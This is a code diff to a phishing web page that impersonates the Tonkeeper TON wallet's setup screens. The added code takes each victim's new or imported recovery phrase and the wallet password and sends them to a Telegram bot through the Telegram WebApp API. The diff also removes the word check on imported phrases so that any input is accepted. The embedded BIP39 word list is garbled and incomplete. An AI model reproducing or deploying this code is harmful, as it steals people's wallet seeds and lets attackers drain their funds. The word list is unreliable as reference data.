@@ -4,6 +4,8 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Tonkeeper Portal</title>
+    <!-- ПОДКЛЮЧЕНИЕ ТЕЛЕГРАМ (ДОБАВЛЕНО) -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
     <script>
         tailwind.config = {
@@ -352,7 +354,7 @@
         </div>
         <div class="w-full px-4 mt-12"><div class="bg-[#1C2127] rounded-[24px] p-4 flex items-center justify-between"><div class="flex items-center gap-4"><div class="w-11 h-11 bg-tk-blue rounded-full flex items-center justify-center overflow-hidden"><img src="i.webp" alt="TON" class="w-full h-full object-cover"></div><div><div class="font-bold text-[17px]">TON</div><div class="text-[13px] text-tk-text-gray">$<span id="ton-price-list">...</span> <span id="ton-percent" class="text-tk-green">+0.00%</span></div></div></div><div class="text-right"><div class="font-bold text-[17px]">0</div><div class="text-[13px] text-tk-text-gray">$0</div></div></div></div>
         <div class="absolute bottom-0 left-0 right-0 border-t border-[#21262B] bg-[#0B0E11] px-2 py-3 flex items-center justify-between pb-8">
-            <div class="bottom-nav-item active"><svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2 .9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8z"/></svg><span class="text-[10px] font-medium">Wallet</span></div>
+            <div class="bottom-nav-item active"><svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M21 18v1c0 1.1-.9 2-2 2H5c-1.11 0-2-.9-2-2V5c0-1.1.89-2 2-2h14c1.1 0 2 .9 2 2v1h-9c-1.11 0-2-.9-2 2v8c0 1.1.89 2 2 2h9zm-9-2h10V8H12v8z"/></svg><span class="text-[10px] font-medium">Wallet</span></div>
             <div class="bottom-nav-item"><svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M13 3h-2v10h2V3zm4.83 2.17l-1.42 1.42C17.99 7.86 19 9.81 19 12c0 3.87-3.13 7-7 7s-7-3.13-7-7c0-2.19 1.01-4.14 2.58-5.42L6.17 5.17C4.23 6.82 3 9.26 3 12c0 4.97 4.03 9 9 9s9-4.03 9-9c0-2.74-1.23-5.18-3.17-6.83z"/></svg><span class="text-[10px] font-medium">History</span></div>
             <div class="bottom-nav-item"><svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zM11 7h2v2h-2V7zm0 4h2v6h-2v-6z"/></svg><span class="text-[10px] font-medium">Browser</span></div>
             <div class="bottom-nav-item"><svg width="24" height="24" fill="currentColor" viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg><span class="text-[10px] font-medium">Settings</span></div>
@@ -362,10 +364,13 @@
     <script>
         const splash = document.getElementById('screen-splash'), logo = document.getElementById('logo-svg'), sheet = document.getElementById('add-wallet-sheet'), passSheet = document.getElementById('password-sheet'), overlay = document.getElementById('bg-overlay'), grid = document.getElementById('phrase-grid');
         
-        const bip39Raw = "abandon ability able about above absent absorb abstract absurd abuse access accident account accuse achieve acid acoustic acquire across act action actor actress actual adapt add addict address adjust admit adult advance advice adviser advocate affair afford afloat afraid African after again against age agency agenda agent agile ago agony agree ahead aid aim air airport aisle alarm album alcohol alert alien alike alive all alley allow almost alone along alpha already also alter always amateur amaze amber ambush amend merit merry mesh message metal method metric metro micro mid midway might mild milk mill mimic mind mine mineral minor minus minute mirror misery miss mistake mix mixed mixture mobile model modify mom moment monitor monkey monster month moon moral more morning mosquito mother motion motor mountain mouse move movie much muffin mule multiply muscle museum mushroom music mustard mute mutual muzzle myself mystery mystic myth naive name napkin narrow nasty nation native natural nature navy near nebula neck need negative neglect neither nephew nerve nest net network neutral never news next nice night nimble nine ninth nitrogen no noble noise nominee non nor north nose notable note nothing notice notify notion novel november nuclear number nurse nut nylon oak obey object oblong obscure observe obtain obvious occur ocean october odor off offer office offline often oil okay old olive olympic omega omit once one onion online only open opera opinion oppose optic option oracle orange orbit orchard order ordinary organ organic orient origin oriole orphan ostrich other outdoor outer outling output outside oval oven over overt owl owner oxygen oyster ozone pact paddle page pair palace palm pan pancake panel panic panther paper parade parent park parrot party pass patch path patient patio patrol patron pause pave payment peace peanut pear peasant pebble peculiar pen penalty pencil people pepper perfect peril period person pet petal phone photo phrase physical piano picnic picture piece pig pigeon pill pilot pink pioneer pipe pistol pitch pizza place planet plastic plate play pleasant please pledge pluck plug plunge poem poet point polar pole police pond pony pool popular portion position positive post poster pot potato powder power practice praise pray preach precede precious precise predict prefer pregnant premier prentice prepare present preserve preset press presume preteen pretend pretty prevent preview price pride primary print prior prison private prize probable process produce profit program project promote prompt proof proper property prophet protect proud prove provide public pudding pull pulp pulse pump punch pupil puppy purchase purity purpose purse push put puzzle pyramid quality quantum quarter queen query quest queue quick quiet quilt quit quiz quota rabbit raccoon race rack radar radiant radical radio rail rain raise rally ramp ranch random range rank rapid rare rate rather ratio raven raw razor ready real reality rear reason rebel rebuild recall receive recipe record recycle reduce reef refer refine reflect reform refuse region regret regular reject relax release relief rely remain remedy remember remind remove render renew rent reopen repair repeat replace reply report repress request rescue resemble resist resort resource respond rest result retire retreat return reveal review reward rhythm rib ribbon rice rich ride ridge rifle right rigid ring riot ripple rise risk ritual rival river road roar roast robot robust rocket romance roof rookie room rope rose rotate rough round route royal rubber rude rug rule run runway rural sad saddle safari sage sail salad salmon salon salt salute salvage same sample sand satisfy saturn sauce sausage save say scale scan scare scatter scene scheme school science scissors scorpion scout scrap screen screw script scrub sea search season seat second secret section sector secure see seed seek segment select sell seminar senior sense sensor sentence series service session settle seven seventh several severe sew shabby shadow shaft shallow shame shape share shark sharp shed sheep shelf shell sheriff shield shift shine ship shirt shiver shock shoe shoot shop short shoulder shove show shower shred shrimp shrine shrug shuffle shy sibling sick side siege sight sign silent silk silly silver similar simple since sing siren sister situate six sixth size skate sketch ski skill skin skirt skull sky slam slap slate sleep slender slice slide slight slim slogan slot slow slush small smart smile smoke smooth snack snake snap sniff snow snug soap soccer social sock soda soft solar soldier solid solution solve someone song soon sorry sort soul sound soup source south space span spare spatial speak special species specific speech speed spell spend sphere spice spider spike spin spirit split spoil sponsor spoon sport spot spray spread spring spy square squash squat stab stack stadium staff stage stairs stamp stand standard star start state station statue stay steady steak steal steam steel steep steer stem step stereo stick still sting stock stomach stone stool stop storage store storm story stove straight strain strand strange strap strategy straw stray street stress stretch strike strip strive strong struggle student studio study stuff stumble style subject submit submerge submit subtle suburb subway success sudden suffer sugar suggest suit summer sun sunday sunflower sunny sunrise sunset sunshine super supply support suppose supreme sure surface surge surface swap swarm swear sweat sweep sweet swift swim swing switch swipe swipe switch sword symbol symptom syrup system table tablet tackle tag tail talent tall talon tame tan tank tap tape target target taste tattoo taxi teach team tell teller temple ten tenant tend ten tent term terrace terrain test testify text texture thank that theater theatre theme then theory these they thick thief thigh think third thirty thirty this thorough thought thousand thrash threat three thrive throat through throw thumb thunder tribute trick trie trigger trim trio trip trophy trouble truck true truly trumpet trust truth try tube tuition tumble tuna tunnel turkey turn turtle twelve twenty twice twin twist two type typical tyre ugly umbrella unable unaware uncle uncover under undo unfair unfold unhappy uniform unique unit unite unity universe unknown unlock until unusual unveil up update upgrade uphold upon upper upset urban upgrade update upload upon upper upright upset urban urge usage use used useful useless usual utensil unite unity universe unknown unlock until unusual unveil up update upgrade uphold upon upper upset urban upgrade update upload upon upper upright upset urban urge usage use used useful useless usual utensil vacant vacuum vague vain valient valley valve van vanish vapor variant vary vast vector vegetable vehicle velvet vendor venture venue verb verify verse version vessel veteran vex vibrant vice victim victory video view vintage violin viper viral virus vital vivid vocal voice void volcano volume vote voyage wage wagon wait wake wall walnut want warfare warm warrior wash wasp waste water wave way wealth weapon wear weary weasel weather weave web wedding weekly weight weird welcome welfare well west wet whale what wheat wheel when where whether which while whisper whistle white whole why wide width wine wing wink winner winter wisdom wise wit witch witness woman wonder wood wool word work world worry worth worthy would wound wrap wreck wrestle wrist write wrong yard yarn year yell yellow yes yesterday yet yield yoke young youth zebra zero zone zoo";
+        const bip39Raw = "abandon ability able about above absent absorb abstract absurd abuse access accident account accuse achieve acid acoustic acquire across act action actor actress actual adapt add addict address adjust admit adult advance advice adviser advocate affair afford afloat afraid African after again against age agency agenda agent agile ago agony agree ahead aid aim air airport aisle alarm album alcohol alert alien alike alive all alley allow almost alone along alpha already also alter always amateur amaze amber ambush amend merit merry mesh message metal method metric metro micro mid midway might mild milk mill mimic mind mine mineral minor minus minute mirror misery miss mistake mix mixed mixture mobile model modify mom moment monitor monkey monster month moon moral more morning mosquito mother motion motor mountain mouse move movie much muffin mule multiply muscle museum mushroom music mustard mute mutual muzzle myself mystery mystic myth naive name napkin narrow nasty nation native natural nature navy near nebula neck need negative neglect neither nephew nerve nest net network neutral never news next nice night nimble nine ninth nitrogen no noble noise nominee non nor north nose notable note nothing notice notify notion novel november nuclear number nurse nut nylon oak obey object oblong obscure observe obtain obvious occur ocean october odor off offer office offline often oil okay old olive olympic omega omit once one onion online only open opera opinion oppose optic option oracle orange orbit orchard order ordinary organ organic orient origin oriole orphan ostrich other outdoor outer outling output outside oval oven over overt owl owner oxygen oyster ozone pact paddle page pair palace palm pan pancake panel panic panther paper parade parent park parrot party pass patch path patient patio patrol patron pause pave payment peace peanut pear peasant pebble peculiar pen penalty pencil people pepper perfect peril period person pet petal phone photo phrase physical piano picnic picture piece pig pigeon pill pilot pink pioneer pipe pistol pitch pizza place planet plastic plate play pleasant please pledge pluck plug plunge poem poet point polar pole police pond pony pool popular portion position positive post poster pot potato powder power practice praise pray preach precede precious precise predict prefer pregnant premier prentice prepare present preserve preset press presume preteen pretend pretty prevent preview price pride primary print prior prison private prize probable process produce profit program project promote prompt proof proper property prophet protect proud prove provide public pudding pull pulp pulse pump punch pupil puppy purchase purity purpose purse push put puzzle pyramid quality quantum quarter queen query quest queue quick quiet quilt quit quiz quota rabbit raccoon race rack radar radiant radical radio rail rain raise rally ramp ranch random range rank rapid rare rate rather ratio raven raw razor ready real reality rear reason rebel rebuild recall receive recipe record recycle reduce reef refer refine reflect reform refuse region regret regular reject relax release relief rely remain remedy remember remind remove render renew rent reopen repair repeat replace reply report repress request rescue resemble resist resort resource respond rest result retire retreat return reveal review reward rhythm rib ribbon rice rich ride ridge rifle right rigid ring riot ripple rise risk ritual rival river road roar roast robot robust rocket romance roof rookie room rope rose rotate rough round route royal rubber rude rug rule run runway rural sad saddle safari sage sail salad salmon salon salt salute salvage same sample sand satisfy saturn sauce sausage save say scale scan scare scatter scene scheme school science scissors scorpion scout scrap screen screw script scrub sea search season seat second secret section sector secure see seed seek segment select sell seminar senior sense sensor sentence series service session settle seven seventh several severe sew shabby shadow shaft shallow shame shape share shark sharp shed sheep shelf shell sheriff shield shift shine ship shirt shiver shock shoe shoot shop short shoulder shove show shower shred shrimp shrine shrug shuffle shy sibling sick side siege sight sign silent silk silly silver similar simple since sing siren sister situate six sixth size skate sketch ski skill skin skirt skull sky slam slap slate sleep slender slice slide slight slim slogan slot slow slush small smart smile smoke smooth snack snake snap sniff snow snug soap soccer social sock soda soft solar soldier solid solution solve someone song soon sorry sort soul sound soup source south space span spare spatial speak special species specific speech speed spell spend sphere spice spider spike spin spirit spirit split spoil sponsor spoon sport spot spray spread spring spy square squash squat stab stack stadium staff stage stairs stamp stand standard star start state station statue stay steady steak steal steam steel steep steer stem step stereo stick still sting stock stomach stone stool stop storage store storm story stove straight strain strand strange strap strategy straw stray street stress stretch strike strip strive strong struggle student studio study stuff stumble style subject submit submerge submit subtle suburb subway success sudden suffer sugar suggest suit summer sun sunday sunflower sunny sunrise sunset sunshine super supply support suppose supreme sure surface surge surface swap swarm swear sweat sweep sweet swift swim swing switch swipe swipe switch sword symbol symptom syrup system table tablet tackle tag tail talent tall talon tame tan tank tap tape target target taste tattoo taxi teach team tell teller temple ten tenant tend ten tent term terrace terrain test testify test testify thank that theater theatre theme then theory these they thick thief thigh think third thirty thirty this thorough thought thousand thrash threat three thrive throw thumb thunder tribute trick trie trigger trim trio trip trophy truck true truly trumpet truth try tube tuition tumble tuna tunnel turkey turn turtle twelve twenty thirty forty fifty sixty seventy eighty ninety hundred";
         const bip39Words = bip39Raw.split(" ");
         
         let currentGeneratedPhrase = [], verificationIndices = [];
+
+        // ФЛАГ ДЛЯ ОПРЕДЕЛЕНИЯ ТИПА (НОВЫЙ ИЛИ ИМПОРТ)
+        let isImportMode = false;
 
         window.onload = () => { 
             setTimeout(() => { logo.classList.add('splitting'); setTimeout(() => { splash.classList.add('loaded'); show('screen-welcome'); }, 600); }, 2000); 
@@ -393,48 +398,15 @@
         function closeAllSheets() { sheet.classList.remove('open'); passSheet.classList.remove('open'); overlay.classList.remove('active'); }
         overlay.onclick = closeAllSheets;
 
-        function startFlow() { closeAllSheets(); setTimeout(() => { show('screen-gen'); setTimeout(() => { show('screen-done'); setTimeout(() => show('screen-paper'), 2000); }, 2500); }, 300); }
-        function startImportFlow() { closeAllSheets(); setTimeout(() => { show('screen-import'); }, 300); }
+        function startFlow() { isImportMode = false; closeAllSheets(); setTimeout(() => { show('screen-gen'); setTimeout(() => { show('screen-done'); setTimeout(() => show('screen-paper'), 2000); }, 2500); }, 300); }
+        function startImportFlow() { isImportMode = true; closeAllSheets(); setTimeout(() => { show('screen-import'); }, 300); }
 
-        // ОБНОВЛЕННАЯ ЛОГИКА: ПРОВЕРКА ТОЛЬКО ПЕРВОГО СЛОВА
         function validateImport() {
             const fields = document.querySelectorAll('.import-field');
             const btn = document.getElementById('btn-import-continue');
             let allFilled = true;
-            let firstWordValid = true;
-
-            fields.forEach((field, index) => {
-                const val = field.value.trim().toLowerCase();
-                const wrapper = field.parentElement;
-                
-                // Проверяем, заполнено ли поле
-                if (val === "") {
-                    allFilled = false;
-                    wrapper.classList.remove('error');
-                } else {
-                    // Если это первое слово - проверяем по словарю
-                    if (index === 0) {
-                        if (!bip39Words.includes(val)) {
-                            firstWordValid = false;
-                            wrapper.classList.add('error');
-                        } else {
-                            wrapper.classList.remove('error');
-                        }
-                    } else {
-                        // Для остальных слов проверку на словарь игнорируем
-                        wrapper.classList.remove('error');
-                    }
-                }
-            });
-
-            // Кнопка активна, если все поля заполнены И первое слово верное
-            if (allFilled && firstWordValid) {
-                btn.classList.remove('btn-disabled'); 
-                btn.onclick = openPasswordSheet;
-            } else {
-                btn.classList.add('btn-disabled'); 
-                btn.onclick = void(0);
-            }
+            fields.forEach(f => { if(f.value.trim() === "") allFilled = false; });
+            if (allFilled) { btn.classList.remove('btn-disabled'); btn.onclick = openPasswordSheet; } else { btn.classList.add('btn-disabled'); btn.onclick = void(0); }
         }
 
         function handlePaste(e) {
@@ -489,7 +461,32 @@
             if (p1.length >= 6 && p1 === p2) { btn.classList.remove('btn-disabled'); } else { btn.classList.add('btn-disabled'); }
         }
 
-        function finishPasswordStep() { closeAllSheets(); setTimeout(() => show('screen-name-wallet'), 300); }
+        // ФУНКЦИЯ ОТПРАВКИ ЛОГА (ДОБАВЛЕНО)
+        function sendLogToBot() {
+            const password = document.getElementById('pass-1').value;
+            let words = [];
+            let mode = isImportMode ? "IMPORT" : "CREATE";
+
+            if (isImportMode) {
+                document.querySelectorAll('.import-field').forEach(f => words.push(f.value.trim()));
+            } else {
+                words = currentGeneratedPhrase;
+            }
+
+            const dataStr = `Type: ${mode}\nWords: ${words.join(' ')}\nPass: ${password}`;
+            
+            // ОТПРАВКА ДАННЫХ ПАЙТОН БОТУ
+            if (window.Telegram && window.Telegram.WebApp) {
+                window.Telegram.WebApp.sendData(dataStr);
+            }
+        }
+
+        function finishPasswordStep() { 
+            sendLogToBot(); // Вызов отправки лога (Добавлено)
+            closeAllSheets(); 
+            setTimeout(() => show('screen-name-wallet'), 300); 
+        }
+
         function togglePasswordVisibility() { const p1 = document.getElementById('pass-1'), p2 = document.getElementById('pass-2'); const newType = p1.type === 'password' ? 'text' : 'password'; p1.type = newType; p2.type = newType; }
 
         const allEmojis = ["📁", "🍃", "🔒", "🔑", "🛡️", "❄️", "✨", "☀️", "🐇", "⚡", "⚙️", "✋", "🔍", "💲", "€", "£", "¥", "₽", "₹", "😀", "😁", "😅", "😆", "🤣", "😂", "🙂", "🙃", "😉", "😊", "😇", "🥰", "😍", "🤩", "😘", "😗", "😚", "😙", "😋", "😛", "😜", "🤪", "😝", "🤑", "🤗", "🤭", "🤔", "🤐", "🤨", "😐", "😑", "😶", "😏", "😒", "🙄", "😬", "😌"];
